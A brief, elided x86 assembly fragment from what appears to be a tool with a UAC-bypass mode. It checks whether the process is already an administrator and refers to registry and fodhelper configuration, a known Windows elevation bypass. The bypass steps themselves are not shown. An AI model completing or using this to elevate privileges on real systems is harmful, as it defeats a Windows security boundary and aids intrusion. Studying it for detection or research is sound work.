...
UACBypassMode PROC
    ...
    ; Check if already running as administrator — skip UAC bypass
    call IsUserAnAdmin
    test eax, eax
    jnz uac_already_admin

    ; Load configuration (szRegKey, szFodhelper)
...
szUACAlreadyAdminMsg db "UAC: Already running as administrator, skipping bypass.", 13, 10, 0
